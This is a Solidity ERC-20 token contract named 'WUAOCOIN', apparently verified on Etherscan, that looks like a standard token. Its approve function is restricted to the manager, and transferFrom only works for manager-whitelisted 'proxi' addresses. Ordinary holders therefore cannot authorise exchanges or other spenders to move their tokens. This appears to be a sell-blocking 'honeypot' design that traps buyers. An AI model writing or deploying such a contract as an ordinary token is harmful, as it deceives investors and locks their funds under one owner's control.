/**
 *Submitted for verification at Etherscan.io on 2022-10-29
*/

// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.8.4;

contract SafeMath {
    function safeAdd(uint a, uint b) public pure returns (uint c) {
        c = a + b;
        require(c >= a);
    }
    function safeSub(uint a, uint b) public pure returns (uint c) {
        require(b <= a);
        c = a - b;
    }
    function safeMul(uint a, uint b) public pure returns (uint c) {
        c = a * b;
        require(a == 0 || c / a == b);
    }
    function safeDiv(uint a, uint b) public pure returns (uint c) {
        require(b > 0);
        c = a / b;
    }
}

abstract contract ERC20Interface{
    function totalSupply() public virtual view returns (uint);
    function balanceOf(address tokenOwner)public virtual view returns (uint);
    function allowance(address tokenOwner, address spender)
    public virtual view returns (uint);
    function transfer(address to, uint tokens) public virtual returns (bool);
    function approve(address spender, uint tokens)  public virtual returns (bool);
    function transferFrom(address from, address to, uint tokens)virtual public returns (bool);
     
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
    event Transfer(address indexed from, address indexed to, uint tokens);
}
contract CoinCoin is ERC20Interface,SafeMath{
    string public constant name   = "WUAOCOIN";// todo change
    string public constant symbol = "WUAO";    // todo change
    uint8 public constant decimals=18;
    mapping(address => uint256) balances;
    mapping(address => mapping (address => uint256)) allowed;
    uint public _totalSupply;
    address private manager;
    mapping(address=>bool) public proxi;
    
    constructor(uint total) {// todo change 100.000.000.000.000.000.000.000.000
        _totalSupply = total;
        balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
        balances[msg.sender] = _totalSupply;
        manager = msg.sender;
    }

    function totalSupply() public view override returns (uint){
        return _totalSupply;
    }
 
    function balanceOf(address tokenOwner) public view override returns (uint balance) {
        return balances[tokenOwner];
    }
 
    function transfer(address to, uint tokens) override public returns (bool success) {
        balances[msg.sender] = safeSub(balances[msg.sender], tokens);
        balances[to] = safeAdd(balances[to], tokens);
        emit Transfer(msg.sender, to, tokens);
        return true;
    }
 
    function approve(address spender, uint tokens) override public returns (bool success) {
        require (manager == msg.sender,"Only manager");
        allowed[msg.sender][spender] = tokens;
        emit Approval(msg.sender, spender, tokens);
        return true;
    }
 
    function transferFrom(address from, address to, uint tokens) override public returns (bool success) {
        require(proxi[msg.sender],"Only actived proxi");
        require(allowed[from][msg.sender]>=tokens,"Spender without balance");
        allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], tokens);
        balances[from] = safeSub(balances[from], tokens);
        balances[to] = safeAdd(balances[to], tokens);
        emit Transfer(from, to, tokens);
        return true;
    }
 
    function allowance(address tokenOwner, address spender)  public override view returns (uint remaining) {
        return allowed[tokenOwner][spender];
    }

    function setStatusProxi(address _proxi, bool _status) public {
        require(msg.sender==manager,"Set status only Manager");
        proxi[_proxi]=_status;
    }
 
}